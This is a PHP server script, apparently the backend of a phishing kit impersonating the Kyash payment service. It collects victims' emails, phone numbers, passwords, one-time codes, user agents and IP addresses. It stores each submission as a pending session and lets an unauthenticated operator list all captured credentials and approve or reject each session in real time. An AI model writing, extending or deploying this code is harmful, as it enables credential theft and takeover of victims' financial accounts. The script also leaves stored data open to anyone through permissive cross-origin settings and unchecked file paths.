<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-cache, no-store, must-revalidate');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

$sessionDir = sys_get_temp_dir() . '/kyash_auth_sessions';
$pendingFile = $sessionDir . '/pending.json';
if (!is_dir($sessionDir)) {
    mkdir($sessionDir, 0777, true);
}

function getClientIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    if (!empty($_SERVER['HTTP_X_FORWARDED'])) return $_SERVER['HTTP_X_FORWARDED'];
    if (!empty($_SERVER['HTTP_FORWARDED_FOR'])) return $_SERVER['HTTP_FORWARDED_FOR'];
    if (!empty($_SERVER['HTTP_FORWARDED'])) return $_SERVER['HTTP_FORWARDED'];
    return $_SERVER['REMOTE_ADDR'];
}

function sanitize($value) {
    return is_string($value) ? trim(strip_tags($value)) : '';
}

// ===== GET: getPending - 待機中リクエスト取得 =====
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $action = $_GET['action'] ?? '';
    
    if ($action === 'getPending') {
        $pending = [];
        if (file_exists($pendingFile)) {
            $pending = json_decode(file_get_contents($pendingFile), true) ?? [];
        }
        http_response_code(200);
        echo json_encode(['success' => true, 'pending' => $pending, 'count' => count($pending)]);
        exit;
    }

    // セッションステータス確認
    $sessionId = sanitize($_GET['sessionId'] ?? '');
    if (!$sessionId) {
        http_response_code(400);
        echo json_encode(['success' => false, 'error' => 'sessionId required']);
        exit;
    }

    $sessionFile = $sessionDir . '/' . $sessionId . '.json';
    if (file_exists($sessionFile)) {
        $data = json_decode(file_get_contents($sessionFile), true);
        echo json_encode([
            'success' => true,
            'status' => $data['status'] ?? 'pending',
            'approved' => ($data['status'] ?? '') === 'approved',
            'rejected' => ($data['status'] ?? '') === 'rejected'
        ]);
    } else {
        echo json_encode(['success' => true, 'status' => 'pending', 'approved' => false, 'rejected' => false]);
    }
    exit;
}

// ===== POST: リクエスト受信・承認・拒否 =====
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (!isset($input['sessionId'])) {
        http_response_code(400);
        echo json_encode(['success' => false, 'error' => 'sessionId required']);
        exit;
    }

    $sessionId = sanitize($input['sessionId']);
    $action = sanitize($input['action'] ?? 'pending');
    $type = sanitize($input['type'] ?? 'UNKNOWN');
    $email = sanitize($input['email'] ?? '');
    $phone = sanitize($input['phone'] ?? '');
    $password = sanitize($input['password'] ?? '');
    $userAgent = sanitize($input['userAgent'] ?? '');
    $code = sanitize($input['code'] ?? '');
    $timestamp = sanitize($input['timestamp'] ?? date('Y-m-d H:i:s'));
    $clientIP = getClientIP();

    $sessionFile = $sessionDir . '/' . $sessionId . '.json';
    $existingData = [];
    if (file_exists($sessionFile)) {
        $existingData = json_decode(file_get_contents($sessionFile), true);
    }

    // ===== CASE 1: 新規リクエスト（pending） =====
    if ($action === 'pending') {
        $data = [
            'sessionId' => $sessionId,
            'status' => 'pending',
            'type' => $type,
            'email' => $email,
            'phone' => $phone,
            'password' => $password,
            'code' => $code,
            'userAgent' => $userAgent,
            'clientIP' => $clientIP,
            'timestamp' => $timestamp,
            'created_at' => date('Y-m-d H:i:s')
        ];

        file_put_contents($sessionFile, json_encode($data, JSON_UNESCAPED_UNICODE));

        // pending.json に追加
        $pending = [];
        if (file_exists($pendingFile)) {
            $pending = json_decode(file_get_contents($pendingFile), true) ?? [];
        }
        $pending = array_filter($pending, fn($p) => ($p['sessionId'] ?? '') !== $sessionId);
        $pending[] = $data;
        file_put_contents($pendingFile, json_encode(array_values($pending), JSON_UNESCAPED_UNICODE));

        error_log("[NEW_REQUEST] Session: $sessionId | Type: $type | User: $email/$phone");

        http_response_code(200);
        echo json_encode(['success' => true, 'sessionId' => $sessionId, 'status' => 'pending']);
        exit;
    }

    // ===== CASE 2: 承認・拒否 =====
    if (!in_array($action, ['approved', 'rejected'])) {
        http_response_code(400);
        echo json_encode(['success' => false, 'error' => 'invalid action']);
        exit;
    }

    $data = array_merge($existingData, ['status' => $action, 'updated_at' => date('Y-m-d H:i:s')]);
    file_put_contents($sessionFile, json_encode($data, JSON_UNESCAPED_UNICODE));

    if (file_exists($pendingFile)) {
        $pending = json_decode(file_get_contents($pendingFile), true) ?? [];
        $pending = array_filter($pending, fn($p) => ($p['sessionId'] ?? '') !== $sessionId);
        file_put_contents($pendingFile, json_encode(array_values($pending), JSON_UNESCAPED_UNICODE));
    }

    error_log("[$action] Session: $sessionId | Type: $type");

    http_response_code(200);
    echo json_encode(['success' => true, 'sessionId' => $sessionId, 'status' => $action]);
    exit;
}

http_response_code(405);
echo json_encode(['success' => false, 'error' => 'method not allowed']);
?>
